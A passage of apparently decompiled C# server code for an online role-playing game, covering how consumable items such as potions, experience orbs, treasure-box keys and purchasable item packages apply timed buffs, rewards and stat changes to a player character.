						goto IL_a6ab;
					}
					case 1008000188:
					{
						if (GetAddState(1008000245) || GetAddState(1008000252) || GetAddState(1008000232) || GetAddState(1008000188))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类66 = new 追加状态类(this, 14400000, num5, 1);
						追加状态列表.Add(追加状态类66.FLD_PID, 追加状态类66);
						addFLD_追加百分比_攻击(0.15);
						addFLD_追加百分比_防御(0.15);
						base.人物追加最大_HP += 300;
						base.人物追加最大_MP += 300;
						base.FLD_人物_追加_经验百分比 += 0.1;
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
						状态效果(array, 1, 14400000);
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000156:
					{
						if (GetAddState(1008000183) || GetAddState(1008000156) || GetAddState(1008000195) || GetAddState(1008000187))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类64 = new 追加状态类(this, 864000000, num5, 1);
						追加状态列表.Add(追加状态类64.FLD_PID, 追加状态类64);
						base.人物追加最大_HP += 300;
						更新人物数据(this);
						更新广播人物数据();
						状态效果(array, 1, 864000000);
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000159:
						if (!GetAddState(1008000159) && !GetAddState(1008000160))
						{
							追加状态类 追加状态类63 = new 追加状态类(this, 28800000, num5, 1);
							追加状态列表.Add(追加状态类63.FLD_PID, 追加状态类63);
							状态效果(array, 1, 28800000);
							物品使用(num2, num3, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000160:
						if (!GetAddState(1008000159) && !GetAddState(1008000160))
						{
							追加状态类 追加状态类62 = new 追加状态类(this, 86400000, num5, 1);
							追加状态列表.Add(追加状态类62.FLD_PID, 追加状态类62);
							状态效果(array, 1, 86400000);
							物品使用(num2, num3, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000162:
					case 1008000182:
					case 1008000185:
					{
						if (GetAddState(1008000097) || GetAddState(1008000096) || GetAddState(1008000095) || GetAddState(1008000321) || GetAddState(1008000322) || GetAddState(1008000323) || GetAddState(1008000324) || GetAddState(1008000362) || GetAddState(1008000363) || GetAddState(1008000239) || GetAddState(1008000248))
						{
							新吃药提示();
							break;
						}
						if (追加状态New列表.Count > 0)
						{
							新吃药提示();
							break;
						}
						int 时间4 = 3600000;
						Set追加状态物品(1, 3600000, 10, 2);
						Set追加状态物品(2, 3600000, 10, 2);
						switch (num5)
						{
						default:
							Set追加状态物品(3, 时间4, 700, 1);
							break;
						case 1008000182:
							Set追加状态物品(3, 时间4, 500, 1);
							break;
						case 1008000162:
							Set追加状态物品(3, 时间4, 300, 1);
							break;
						}
						Set追加状态物品(9, 时间4, 40, 2);
						Set追加状态物品(15, 时间4, 100, 2);
						addFLD_装备_追加_武器_强化(2);
						addFLD_装备_追加_防具_强化(1);
						计算人物装备数据();
						更新武功和状态();
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000163:
						if (追加状态New列表.Count > 0)
						{
							新吃药提示();
							break;
						}
						Set追加状态物品(1, 3600000, 10, 2);
						Set追加状态物品(2, 3600000, 10, 2);
						Set追加状态物品(3, 3600000, 700, 1);
						Set追加状态物品(7, 3600000, 5, 2);
						Set追加状态物品(8, 3600000, 10, 2);
						计算人物装备数据();
						更新武功和状态();
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					case 1008000212:
						if (追加状态New列表.Count > 0)
						{
							新吃药提示();
						}
						else
						{
							Set追加状态物品(1, 7200000, 20, 2);
							Set追加状态物品(7, 7200000, 15, 2);
							Set追加状态物品(5, 7200000, 20, 1);
							Set追加状态物品(6, 7200000, 20, 1);
							Set追加状态物品(14, 7200000, 2, 1);
							计算人物装备数据();
							更新武功和状态();
							物品减去属性数量(num3, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000213:
						if (追加状态New列表.Count > 0)
						{
							新吃药提示();
							break;
						}
						Set追加状态物品(2, 7200000, 20, 2);
						Set追加状态物品(8, 7200000, 10, 2);
						Set追加状态物品(5, 7200000, 20, 1);
						Set追加状态物品(6, 7200000, 20, 1);
						Set追加状态物品(3, 7200000, 500, 1);
						Set追加状态物品(9, 7200000, 20, 2);
						计算人物装备数据();
						更新武功和状态();
						物品减去属性数量(num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					case 1008000216:
					{
						物品类 物品类3 = 得到包裹物品(1000000426);
						if (物品类3 == null || 物品类3.物品位置 == num3)
						{
							break;
						}
						using (new Lock(World.开箱Lock, "钥匙开箱Lock"))
						{
							减去物品(物品类3.物品位置, 1);
							物品使用(num2, num3, 1);
							OpenClass open = OpenClass.GetOpen(1008000216, base.Player_Job, base.Player_Zx);
							if (open != null)
							{
								ItmeClass value17;
								if (World.Itme.TryGetValue(open.FLD_PIDX, out value17))
								{
									int num37 = open.FLD_MAGIC1;
									int value18 = open.FLD_MAGIC2;
									if (value17.FLD_RESIDE2 == 16)
									{
										if (num37 == 0)
										{
											switch (value17.FLD_PID)
											{
											case 800000001:
											case 800000002:
											case 800000011:
											case 800000012:
											case 800000013:
											case 800000023:
											case 800000024:
											case 800000028:
											case 800000030:
											case 800000031:
											case 800000032:
											case 800000033:
											case 800000061:
											case 800000062:
												num37 = World.GetValue(value17.FLD_PID, 6);
												break;
											}
										}
									}
									else
									{
										switch (value17.FLD_PID)
										{
										case 1000000321:
											num37 = RNG.Next(0, 1000);
											value18 = RNG.Next(10, 50);
											break;
										case 1000000323:
											num37 = RNG.Next(0, 1000);
											value18 = RNG.Next(100, 150);
											break;
										case 1000000325:
											num37 = RNG.Next(0, 1000);
											value18 = RNG.Next(400, 699);
											break;
										case 1000000327:
											num37 = RNG.Next(0, 1000);
											value18 = RNG.Next(2000, 2499);
											break;
										}
									}
									byte[] array12 = new byte[56];
									System.Buffer.BlockCopy(BitConverter.GetBytes(num37), 0, array12, 0, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(value18), 0, array12, 4, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_MAGIC3), 0, array12, 8, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_MAGIC4), 0, array12, 12, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_MAGIC5), 0, array12, 16, 4);
									if (open.FLD_中级附魂 > 0)
									{
										System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array12, 22, 2);
										System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_中级附魂), 0, array12, 24, 4);
									}
									System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_觉醒), 0, array12, 46, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_进化), 0, array12, 52, 4);
									增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(open.FLD_PIDX), num3, BitConverter.GetBytes(open.FLD_NUMBER), array12);
									if (open.FLD_PIDX == 800000061 && num37 == 700035)
									{
										World.全局提示("系统提示", 6, "[" + base.UserName + "]用钥匙打开[封印宝箱]获得[" + open.FLD_NAMEX.Trim() + "][WG35]");
									}
									else if (open.FLD_PIDX == 800000062 && num37 == 1100100)
									{
										World.全局提示("系统提示", 6, "[" + base.UserName + "]用钥匙打开[封印宝箱]获得[" + open.FLD_NAMEX.Trim() + "][WF100]");
									}
									else if (open.FLD_PIDX != 700911 && open.FLD_PIDX != 18 && open.FLD_PIDX != 100026)
									{
										系统提示("用钥匙打开[封印宝箱]获得[" + open.FLD_NAMEX.Trim() + "]。", 7, "系统提示");
									}
									else
									{
										World.全局提示("系统提示", 6, "[" + base.UserName + "]用钥匙打开[封印宝箱]获得[" + open.FLD_NAMEX.Trim() + "]");
									}
								}
								else
								{
									Form1.WriteLine(1, "开箱 出错1 物品 [" + open.FLD_PID + "][" + open.FLD_NAME + "]开[" + open.FLD_PIDX + "][" + open.FLD_NAMEX + "] [" + base.Userid + "][" + base.UserName + "] ");
								}
							}
						}
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000264:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000265:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000266:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000272:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000273:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000274:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000232:
					{
						if (GetAddState(1008000245) || GetAddState(1008000252) || GetAddState(1008000232) || GetAddState(1008000188))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类37 = new 追加状态类(this, 7200000, num5, 1);
						追加状态列表.Add(追加状态类37.FLD_PID, 追加状态类37);
						base.人物追加最大_HP += 300;
						base.FLD_人物_追加_经验百分比 += 0.1;
						base.FLD_人物_追加_获得游戏币百分比 += 0.4;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						状态效果(array, 1, 7200000);
						更新人物数据(this);
						更新广播人物数据();
						物品减去属性数量(num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000240:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类38 = new 追加状态类(this, 7200000, num5, 1);
							追加状态列表.Add(追加状态类38.FLD_PID, 追加状态类38);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							状态效果(array, 1, 7200000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000241:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类34 = new 追加状态类(this, 7200000, num5, 1);
							追加状态列表.Add(追加状态类34.FLD_PID, 追加状态类34);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							状态效果(array, 1, 7200000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000242:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类35 = new 追加状态类(this, 7200000, num5, 1);
							追加状态列表.Add(追加状态类35.FLD_PID, 追加状态类35);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							状态效果(array, 1, 7200000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000243:
						if (!追加状态列表.ContainsKey(1008000243))
						{
							追加状态类 追加状态类33 = new 追加状态类(this, 36000000, num5, 1);
							追加状态列表.Add(追加状态类33.FLD_PID, 追加状态类33);
							addFLD_追加百分比_攻击(0.2);
							addFLD_追加百分比_防御(0.2);
							base.人物追加最大_HP += 200;
							base.FLD_人物_追加_经验百分比 += 0.15;
							base.FLD_人物_武功攻击力增加百分比 += 0.05;
							状态效果(array, 1, 36000000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
							break;
						}
						goto IL_a6ab;
					case 1008000245:
					{
						if (GetAddState(1008000245) || GetAddState(1008000252) || GetAddState(1008000232) || GetAddState(1008000188))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类30 = new 追加状态类(this, 14400000, num5, 1);
						追加状态列表.Add(追加状态类30.FLD_PID, 追加状态类30);
						base.人物追加最大_HP += 300;
						base.FLD_人物_追加_回避 += (int)((double)base.FLD_回避 * 0.05);
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						int num9 = ++base.FLD_人物_追加_气功;
						更新气功();
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
						状态效果(array, 1, 14400000);
						物品减去属性数量(num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000248:
						if (!GetAddState(1008000097) && !GetAddState(1008000096) && !GetAddState(1008000095) && !GetAddState(1008000321) && !GetAddState(1008000322) && !GetAddState(1008000323) && !GetAddState(1008000324) && !GetAddState(1008000362) && !GetAddState(1008000363) && !GetAddState(1008000239) && !GetAddState(1008000248))
						{
							if (GetAddStateNew(9))
							{
								新吃药提示();
							}
							else
							{
								追加状态类 追加状态类24 = new 追加状态类(this, 14400000, num5, 1);
								追加状态列表.Add(追加状态类24.FLD_PID, 追加状态类24);
								状态效果(array, 1, 14400000);
								double num8 = base.FLD_人物_追加_经验百分比 += 1.0;
								num8 = (base.FLD_人物_追加_获得游戏币百分比 += 1.0);
								num8 = (base.FLD_人物_追加_物品掉落概率百分比 += 1.0);
								num8 = (base.FLD_人物_追加_历练百分比 += 1.0);
								物品减去属性数量(num3, 1);
								RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
							}
						}
						else
						{
							新吃药提示();
						}
						break;
					case 1008000250:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类23 = new 追加状态类(this, 7200000, num5, 1);
							追加状态列表.Add(追加状态类23.FLD_PID, 追加状态类23);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							状态效果(array, 1, 7200000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000251:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类22 = new 追加状态类(this, 86400000, num5, 1);
							追加状态列表.Add(追加状态类22.FLD_PID, 追加状态类22);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							状态效果(array, 1, 86400000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000252:
						if (!GetAddState(1008000245) && !GetAddState(1008000252) && !GetAddState(1008000232) && !GetAddState(1008000188))
						{
							追加状态类 追加状态类20 = new 追加状态类(this, 3600000, num5, 1);
							追加状态列表.Add(追加状态类20.FLD_PID, 追加状态类20);
							int num9 = ++base.FLD_人物_追加_防御;
							num9 = ++base.人物追加最大_HP;
							num9 = ++base.FLD_人物_追加_回避;
							base.FLD_人物_武功防御力增加百分比 += 0.01;
							base.FLD_人物_武功攻击力增加百分比 += 0.2;
							更新武功和状态();
							更新人物数据(this);
							更新广播人物数据();
							状态效果(array, 1, 3600000);
							物品减去属性数量(num3, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						else
						{
							新吃药提示();
						}
						break;
					case 1008000304:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类18 = new 追加状态类(this, 7200000, num5, 1);
							追加状态列表.Add(追加状态类18.FLD_PID, 追加状态类18);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_追加_防御 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							状态效果(array, 1, 7200000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000305:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类16 = new 追加状态类(this, 86400000, num5, 1);
							追加状态列表.Add(追加状态类16.FLD_PID, 追加状态类16);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_追加_防御 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							状态效果(array, 1, 86400000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000306:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类15 = new 追加状态类(this, 7200000, num5, 1);
							追加状态列表.Add(追加状态类15.FLD_PID, 追加状态类15);
							base.FLD_人物_追加_经验百分比 += 0.1;
							base.FLD_人物_追加_攻击 += 40;
							base.FLD_人物_追加_防御 += 40;
							base.FLD_人物_武功攻击力增加百分比 += 0.05;
							状态效果(array, 1, 7200000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000307:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类14 = new 追加状态类(this, 86400000, num5, 1);
							追加状态列表.Add(追加状态类14.FLD_PID, 追加状态类14);
							base.FLD_人物_追加_经验百分比 += 0.1;
							base.FLD_人物_追加_攻击 += 40;
							base.FLD_人物_追加_防御 += 40;
							base.FLD_人物_武功攻击力增加百分比 += 0.05;
							状态效果(array, 1, 86400000);
							物品减去属性数量(num3, 1);
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000310:
						if (追加状态New列表.Count > 0)
						{
							新吃药提示();
							break;
						}
						Set追加状态物品(1, 3600000, 15, 2);
						Set追加状态物品(2, 3600000, 15, 2);
						Set追加状态物品(3, 3600000, 300, 1);
						Set追加状态物品(5, 3600000, 20, 1);
						Set追加状态物品(14, 3600000, 1, 1);
						更新武功和状态();
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					case 1008000315:
						物品使用(num2, num3, 1);
						base.人物经验 += 装备栏包裹[num3].FLD_MAGIC1;
						计算人物基本数据3();
						更新武功和状态();
						更新经验和历练();
						更新金钱和负重();
						goto IL_a6ab;
					case 1008000095:
					case 1008000096:
					case 1008000097:
					case 1008000239:
					case 1008000321:
					case 1008000322:
					case 1008000323:
					case 1008000324:
					case 1008000362:
					case 1008000363:
						if (!GetAddState(1008000097) && !GetAddState(1008000096) && !GetAddState(1008000095) && !GetAddState(1008000321) && !GetAddState(1008000322) && !GetAddState(1008000323) && !GetAddState(1008000324) && !GetAddState(1008000362) && !GetAddState(1008000363) && !GetAddState(1008000239) && !GetAddState(1008000248))
						{
							if (GetAddStateNew(9))
							{
								新吃药提示();
							}
							else
							{
								int num7 = 7200000;
								if (num5 == 1008000322 || num5 == 1008000324 || num5 == 1008000363)
								{
									num7 = 86400000;
								}
								追加状态类 追加状态类3 = new 追加状态类(this, num7, num5, 1);
								追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
								状态效果(array, 1, num7);
								switch (num5)
								{
								case 1008000095:
									base.FLD_人物_追加_经验百分比 += 0.2;
									break;
								case 1008000096:
									base.FLD_人物_追加_经验百分比 += 0.3;
									break;
								default:
									base.FLD_人物_追加_经验百分比 += 1.5;
									break;
								case 1008000239:
								case 1008000323:
								case 1008000324:
								{
									double num8 = base.FLD_人物_追加_经验百分比 += 1.0;
									break;
								}
								case 1008000097:
								case 1008000321:
								case 1008000322:
									base.FLD_人物_追加_经验百分比 += 0.4;
									break;
								}
								if (num5 != 1008000095 && num5 != 1008000096 && num5 != 1008000097 && num5 != 1008000239)
								{
									物品使用(num2, num3, 1);
								}
								else
								{
									物品减去属性数量(num3, 1);
								}
								RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
							}
						}
						else
						{
							新吃药提示();
						}
						break;
					case 1008000325:
					{
						if (妖花青草)
						{
							break;
						}
						妖花青草 = true;
						追加状态类 追加状态类2 = new 追加状态类(this, 7200000, num5, 1);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						base.FLD_人物_追加_经验百分比 += 0.1;
						base.FLD_人物_追加_攻击 += 40;
						base.FLD_人物_追加_防御 += 40;
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						base.人物追加最大_HP += 300;
						状态效果(array, 1, 7200000);
						物品减去属性数量(num3, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000326:
					{
						if (妖花青草)
						{
							break;
						}
						妖花青草 = true;
						追加状态类 追加状态类 = new 追加状态类(this, 86400000, num5, 1);
						追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
						base.FLD_人物_追加_经验百分比 += 0.1;
						base.FLD_人物_追加_攻击 += 40;
						base.FLD_人物_追加_防御 += 40;
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						base.人物追加最大_HP += 300;
						状态效果(array, 1, 86400000);
						物品减去属性数量(num3, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000280:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000281:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000282:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008000522:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 50, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000522, "50元套餐", num2, num3);
							Form1.WriteLine(5, "打开50元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000523:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 100, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000523, "100元套餐", num2, num3);
							Form1.WriteLine(5, "打开100元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000524:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 200, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000524, "200元套餐", num2, num3);
							Form1.WriteLine(5, "打开200元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000525:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 300, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000525, "300元套餐", num2, num3);
							Form1.WriteLine(5, "打开300元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000526:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 400, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000526, "400元套餐", num2, num3);
							Form1.WriteLine(5, "打开400元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000527:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 500, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000527, "500元套餐", num2, num3);
							Form1.WriteLine(5, "打开500元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000528:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 600, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000528, "600元套餐", num2, num3);
							Form1.WriteLine(5, "打开600元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000529:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 800, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000529, "800元套餐", num2, num3);
							Form1.WriteLine(5, "打开800元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000530:
						if (得到包裹空位数() >= 17)
						{
							发送套装(base.Player_Job, base.Player_Sex, 1000, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000530, "1000元套餐", num2, num3);
